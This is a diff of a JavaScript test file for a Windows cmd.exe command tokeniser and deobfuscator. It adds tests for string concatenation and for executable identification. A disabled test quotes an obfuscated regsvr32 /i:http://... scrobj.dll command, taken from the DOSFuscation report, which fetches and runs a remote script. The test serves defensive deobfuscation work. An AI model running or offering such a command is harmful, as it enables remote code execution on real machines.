@@ -1,7 +1,8 @@
-const assert    = require("chai").assert,
-      tokenise  = require("../../lib/tokeniser"),
-      interpret = require("../../lib/interpreter").interpreter,
-      split_cmd = require("../../lib/interpreter").get_cached_cmd_blocks;
+const assert           = require("chai").assert,
+      tokenise         = require("../../lib/tokeniser"),
+      interpret        = require("../../lib/interpreter").interpreter,
+      identify_command = require("../../lib/interpreter").try_identify_command,
+      split_cmd        = require("../../lib/interpreter").get_cached_cmd_blocks;
 
 const util = {
     filterEOF: (tokens) => tokens.filter(t => t.name !== "EOF"),
@@ -64,7 +65,7 @@ describe("Interpreter", () => {
             });
         });
 
-        describe("Strings", () => {
+        xdescribe("Strings", () => {
 
             it("should concatenate runs of regular strings and literals without delims", () => {
                 const input  = `"abc"def"ghi"`,
@@ -88,14 +89,91 @@ describe("Interpreter", () => {
                     {
                         input:  `""cscr"ipt"`,
                         output: [`"cscript"`]
-                     },
+                    },
                     {
                         input:  `"a"b`,
                         output: [`"ab"`]
+                    },
+                    {
+                        input: `ab"c"`,
+                        output: [`abc`]
+                    },
+                    {
+                        input: `abc /x:"f"oo`,
+                        output: [`abc /x:"foo"`]
                     }
                 ];
 
                 tests.forEach(t => assert.deepEqual(interpret(t.input), t.output));
+            });
+        });
+    });
+
+    describe("Identifiying commands", () => {
+
+        it("should correctly identify commands", () => {
+
+            const tests = [
+                {
+                    input: `"C:\\Windows\\System32\\cmd.exe"`,
+                    output: "cmd",
+                    msg: "Read a quoted path without spaces, return exe."
+                },
+                {
+                    input: `C:\\Windows\\System32\\cmd.exe`,
+                    output: "cmd",
+                    msg: "Read an unquoted path and return the exe."
+                },
+                {
+                    input: `"C:\\Users\\Joe Bloggs\\Desktop\\calc.exe"`,
+                    output: `calc`,
+                    msg: "Read a quoted path containing a space and return the exe."
+                },
+                {
+                    input: `..\\..\\Windows\\regsvr32.exe`,
+                    output: `regsvr32`,
+                    msg: "Read a relative path and return the exe."
+                },
+                {
+                    input: `/foo/bar.exe`,
+                    output: `bar`,
+                    msg: "Read a relative path and return the exe."
+                },
+                {
+                    input: `foo/bar.exe`,
+                    output: `bar`,
+                    msg: "Read a relative path and return the exe."
+                },
+                {
+                    input: `calc.exe`,
+                    output: `calc`,
+                    msg: "Figure out that it's an exe and return the name."
+                },
+                {
+                    input: `regsvr32.exe /s /n foo "bar"`,
+                    output: `regsvr32`
+                },
+                {
+                    input: ` regsvr32 a b c`,
+                    output: `regsvr32`,
+                    msg:    "Strip leading delimiters from cmdstr"
+                }
+            ];
+
+            tests.forEach(
+                t => assert.deepEqual(identify_command(tokenise(t.input)).cmd, t.output, t.msg)
+            );
+        });
+    });
+
+    describe("Running commands", () => {
+
+        xdescribe("From FireEye DOSFuscation Report", () => {
+
+            it("should clean-up regscr32 output", () => {
+                const input  = `regsvr32.exe /s /n /u /i:"h"t"t"p://github.com/a.jpg scrobj.dll`,
+                      output = `regsvr32.exe /s /n /u /i:"http://github.com/a.jpg" scrobj.dll`;
+                assert.deepEqual(interpret(input), [output]);
             });
         });
     });
